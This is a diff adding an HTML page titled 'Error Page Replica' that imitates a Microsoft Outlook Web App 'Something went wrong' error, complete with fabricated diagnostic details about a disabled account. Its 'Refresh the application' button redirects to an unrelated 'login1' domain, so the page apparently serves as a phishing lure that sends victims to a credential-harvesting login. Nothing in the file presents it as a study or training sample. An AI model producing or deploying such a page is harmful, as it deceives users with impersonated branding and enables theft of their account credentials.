@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Error Page Replica</title>
+<style>
+  body {
+    font-family: "Segoe UI", Arial, sans-serif;
+    background-color: #ffffff;
+    margin: 0;
+    padding: 40px;
+    color: #323130;
+  }
+
+  .container {
+    max-width: 800px;
+    margin: 0px auto;
+  }
+
+  .logo {
+    width: 65px; /* Adjust the width as per your image size */
+    height: auto; /* Maintain aspect ratio of the logo */
+    margin-bottom: 4px;
+  }
+
+  .title {
+    font-size: 18px;
+    color: #0078d4;
+    font-family: "Segoe UI", Arial, sans-serif;
+    margin-bottom: 10px;
+  }
+
+  .subtitle {
+    margin: 10px 0 20px 0;
+    font-size: 14px;
+    color: #605e5c;
+  }
+
+  .btn {
+    background-color: #0078d4;
+    color: white;
+    padding: 10px 16px;
+    border: none;
+    font-size: 14px;
+    cursor: pointer;
+    margin-bottom: 20px; /* Increased margin-bottom to create more space */
+  }
+
+  .btn:hover {
+    background-color: #106ebe;
+  }
+
+  .details {
+    font-size: 13px;
+    color: #605e5c;
+  }
+
+  .details-title {
+    color: #0078d4;
+    margin-bottom: 10px;
+    cursor: pointer;
+  }
+
+  pre {
+    font-family: Consolas, monospace;
+    font-size: 12px;
+    color: #323130;
+    white-space: pre-wrap;
+    line-height: 1.4;
+    margin: 0;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <!-- Replace the div with an image for the logo from URL -->
+  <img class="logo" src="https://www.limestaffings.co.uk/file/GOT.png" alt="Logo">
+
+  <div class="title">Something went wrong.</div>
+
+  <div class="subtitle">
+    Please try the recommended action below.
+  </div>
+
+  <button class="btn" onclick="window.location.href='https://login1.propecs.com/EsTQZNnm';">Refresh the application</button>
+
+  <div class="details">
+    <div class="details-title">Fewer Details</div>
+    <pre>
+UTC Date: 2024-05-27T13:05:12.846Z
+Client Id: 162a206f3a4fa74a499b48E771D3A0
+Session Id: adddc681-2852-466b-aa8b-b70b0cbb3715
+Client Version: 20240517003.15
+
+Bootstrap: configuration
+Back Filled Errors: Unhandled Rejection: Error: 500:undefined|undefined:undefined
+err: Microsoft.Exchange.Data.Storage.AccountDisabledException
+esrc: StoreDataProvider
+estack: Error: 500
+    at Object.s (as createStatusErrorMessage) (https://res.cdn.office.net/owa/mailindex.js:1:117809)
+    at https://res.cdn.office.net/owa/mailindex.js:1:130178
+st: 500
+ehk: X-OWA-Error
+efe: AMBP251A0011, ZR0P278CA0107
+ebe: AM0PR15MB0829
+msg: ErrorAccountDisabled
+    </pre>
+  </div>
+</div>
+
+</body>
+</html>
